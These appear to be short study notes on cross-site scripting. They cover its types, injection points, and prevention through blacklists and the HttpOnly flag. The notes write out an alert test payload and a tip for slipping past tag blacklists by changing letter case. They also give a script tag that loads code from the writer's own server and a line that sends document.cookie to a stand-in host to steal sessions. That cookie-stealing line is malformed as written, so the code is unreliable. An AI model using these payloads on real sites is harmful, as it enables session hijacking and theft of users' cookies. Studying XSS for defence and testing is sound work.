Javascript payload injection that will be executed on client side.
Three different types:
- Reflected (in http request)
- Stored (in server-side DB)
- DOM (document object model): runtime only (client-side)

Usually, an attacker would use this vulnerability to steal cookies and use them to impersonate another user, like an admin. But with that, we could also perform keylogging, browser printing, ... We could also take control of the machine with old and insecure browsers

On the other hand, to assess a XSS exists, we use the alert

### **Where**
These payloads can be injected at multiple places:
- forms
- profile editing
- headers
- url parameters

### **Prevention**
To remedy to this vulnerability, some sites blacklist some common names (<img\> for example or <button\>), but you can try with <imG\>
Other tentatives comprise characters blacklist

Additionally, to avoid cookie stealing, a header flag `HTTPonly` can be used to prevent JS to access cookies.
### **Example:**
<script>alert(1)</script> in a search bar, which could trigger an alert

<script src="my-server:8080/myscript.js"></script> to use our own server and do anything from the user browser

<script><img src="http://myip?"+document.cookie></script> is the usual way to go to steal cookies (works of course with a server on our side to receive requests)
